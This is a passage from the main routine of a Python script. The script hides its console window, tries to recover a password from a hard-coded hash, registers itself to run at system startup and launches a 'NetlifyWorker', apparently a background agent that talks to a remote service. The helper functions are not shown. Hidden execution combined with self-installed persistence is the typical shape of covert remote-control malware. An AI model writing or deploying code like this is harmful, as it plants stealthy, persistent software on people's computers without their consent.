
        hide_console()
    
    # Try to auto-detect password from hash
    TARGET_HASH = "ff3d52d9c823d32f76d86ffd3fb473c62b61ba0b67a63e6074ceda5ab19b9e3a"
    detected_password = find_password_from_hash(TARGET_HASH)
    
    if detected_password:
        print(f"🔑 Detected password: {detected_password}")
    else:
        print("❓ Could not auto-detect password")
        print("💡 Please set the password manually in the code")
    
    # Add to startup (only if not already there)
    add_to_startup()
    
    # Create and start worker
    worker = NetlifyWorker()
    
    # Set the password if detected
    if detected_password:
        worker.password = detected_password
        print(f"🔑 Using password: {detected_password}")
    else:
        print("⚠️  Using default password - may not work!")
    
    worker.start()
